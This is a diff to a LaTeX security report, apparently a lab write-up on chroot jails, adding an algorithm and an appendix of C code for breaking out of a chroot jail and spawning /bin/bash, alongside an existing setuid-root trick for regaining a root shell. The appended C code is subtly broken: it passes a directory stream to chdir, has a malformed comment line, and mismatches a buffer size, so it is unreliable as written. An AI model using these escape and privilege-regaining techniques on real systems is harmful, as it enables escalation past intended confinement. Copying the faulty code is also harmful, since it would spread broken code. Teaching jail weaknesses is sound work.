@@ -14,6 +14,7 @@
 \usepackage{mathrsfs}    % fancy maths font
 \usepackage{dsfont}      % indocator finction
 \usepackage{hyperref}
+\usepackage[page, toc]{appendix}
 \usepackage[usenames,dvipsnames]{color}
 
 % \newcommand{\ts}{\textsuperscript}
@@ -267,7 +268,7 @@ root:x:0:0:root:/root:/bin/bash
 
 \subsubsection{Preserve root privileges after exiting jail}
 It is possible to regain root privileges once exited the jail. To this end, we write simple \texttt{C} program shown in \textbf{Listing~\ref{chroot:regainingroot}}. Once compiled, we apply set-root-UID to it by executing \texttt{chown root prog} and \texttt{chmod 4755 prog}.\\
-After leaving \textt{chroot} jail we execute this program and gain root privileges in non-restricted environment. This technique works as set-root-UID done in jail is not removed while exiting it hence normal user can run this script which in turn calls \textt{su -c "/bin/bash"} as a root resulting in root shell.
+After leaving \texttt{chroot} jail we execute this program and gain root privileges in non-restricted environment. This technique works as set-root-UID done in jail is not removed while exiting it hence normal user can run this script which in turn calls \texttt{su -c "/bin/bash"} as a root resulting in root shell.
 
 \vspace{1em}
 \lstset{
@@ -288,6 +289,28 @@ return 0;
 
 \subsection{Breaking out of a \texttt{chroot} jail}
 \subsubsection{\texttt{cd ..} out of jail}
+It is possible to see full directory list of an operating system from within \texttt{chroot} jail. The full \texttt{C} code that we prepared is available in \textbf{Appendix~\ref{app:chroot:cd}} and the quick overview is presented below in \textbf{Algorithm~\ref{alg:chroot:cd}}.
+
+
+\RestyleAlgo{boxed}
+\SetAlCapSkip{1em}
+\LinesNumbered
+\SetCommentSty{mycommfont}
+\vspace{1em}
+\begin{algorithm}[h]
+  \tcc{Once inside the jail}
+  Create empty directory: \texttt{injail}\;
+  Remember the pointer $p$ to \texttt{injail} directory\;
+  \texttt{chroot} to \texttt{injail} directory\;
+  Get out of second jail by changing directory using pointer $p$\;
+  \For{$i \leftarrow 1:1024$}{
+    Try going down (\texttt{..}) the file tree: \texttt{chdir("..")}\;
+  }
+  \texttt{chroot} to current (\texttt{.}) directory\;
+  \tcc{You are out of the jail}
+  \caption{Escaping out of \texttt{chroot} jail.\label{alg:chroot:cd}}
+\end{algorithm}
+\vspace{1em}
 
 \subsubsection{Killing process from within the jail}
 \vspace{1em}
@@ -322,5 +345,83 @@ Option can be:
 \section{Conclusions}
 
 \section{References?}
+
+\newpage
+\begin{appendices}
+\section{\texttt{cd ..} out of \texttt{chroot} jail\label{app:chroot:cd}}
+\lstset{
+  captionpos=b,
+  frame=single,
+  language=C,
+  breaklines=true,
+  caption=Simple \texttt{C} code allowing to \texttt{cd ..} out of \texttt{chroot} jail.,
+  label=chroot:cd
+}
+\begin{lstlisting}
+#include <stdio.h>
+#include <sys/types.h>
+#include <dirent.h>
+#include <errno.h>
+#include <stdlib.h>
+
+void print_current();
+
+int main(int argc, char** argv) {
+  int i;
+  DIR *dir;
+  print_current();
+  puts("Chroot to /tmp\n");
+
+  // Create jail
+  if(chroot("/tmp") != 0) {
+    printf("chroot to /tmp failure \n");
+    exit(EXIT_FAILURE);
+  }
+
+  // Create dir
+  dir = opendir("bin");
+
+
+  if(chroot("/bin") != 0) {
+    printf("chroot to /bin failure \n");
+    exit(EXIT_FAILURE);
+  }
+
+  print_current();
+
+  puts("Chdir to the hander\n");
+  if(chdir(dir) != 0)
+    printf("change directory to handler failure \n");
+
+  print_current();
+
+  for(i = 0; i < 1024; i++) {
+    if(chdir("..") != 0) {
+      printf("%d Unable to cd ..\n", i);
+    }
+  }
+
+  print_current();
+
+  / Chroot to  .
+  if(chroot(".") != 0) {
+    printf("chroot failure \n");
+    exit(EXIT_FAILURE);
+  }
+
+  system("/bin/bash");
+
+  return 0;
+}
+
+void print_current() {
+  char buffer[100];
+
+  getcwd (buffer, 50);
+  printf("Current Directory: %s\n", buffer);
+  return;
+}
+\end{lstlisting}
+\end{appendices}
 
 \end{document}
